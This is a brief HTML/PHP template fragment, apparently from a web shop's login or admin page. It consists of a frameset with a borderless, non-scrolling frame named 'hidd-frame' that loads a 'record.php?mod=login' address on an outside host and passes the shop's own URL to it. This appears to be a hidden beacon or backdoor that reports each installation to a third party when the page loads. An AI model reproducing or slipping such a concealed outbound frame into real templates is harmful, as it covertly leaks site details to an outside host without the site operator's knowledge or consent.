...
<frameset rows="118,*" framespacing="0" border="0" class="test">
  ...
  <frame src="https://qmdd.gf41.net/record.php?mod=login&url=<?php echo $this->_var['shop_url']; ?>" id="hidd-frame" name="hidd-frame" frameborder="no" scrolling="no">
  </frameset>
</head>
<body>
</body>
